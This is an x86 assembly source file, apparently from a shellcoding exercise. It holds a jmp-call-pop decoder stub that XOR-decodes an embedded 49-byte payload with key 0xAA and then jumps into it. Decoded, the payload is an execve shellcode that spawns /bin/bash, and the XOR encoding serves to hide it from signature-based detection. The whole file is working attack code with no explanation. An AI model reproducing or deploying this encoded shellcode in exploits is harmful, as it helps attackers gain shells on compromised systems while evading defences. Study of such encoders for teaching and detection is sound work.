;Encoding the shellcode using XOR
; Byte chosen here is aa
; Could be based on User Input
;
global _start

section .text

_start:

	jmp P2

xorD:	
	;Decode the contents of stack (encoded) onto esi register
	;esi stores the address of the shellcode
	pop esi
	xor ecx,ecx
	; 49 is the length of the shellcode
	mov cl, 49

byteLoopXOR:
	;decoding the  contents of address pointed by esi in place
	xor byte [esi], 0xAA
	inc esi
	loop byteLoopXOR
	
	jmp Shellcode	
	







P2:
	call xorD
	Shellcode: db 0x41,0xb2,0xf4,0x9b,0x6a,0x22,0xec,0xa3,0x23,0xdc,0xa0,0x23,0xec,0xa4,0x23,0x59,0x27,0xe4,0xa0,0x27,0xfc,0xa4,0x1a,0xa1,0x67,0x2a,0x42,0x49,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xc8,0xcb,0xd9,0xc2,0xf2,0xf3,0xf3,0xf3,0xf3,0xe9,0xe9,0xe9,0xe9 

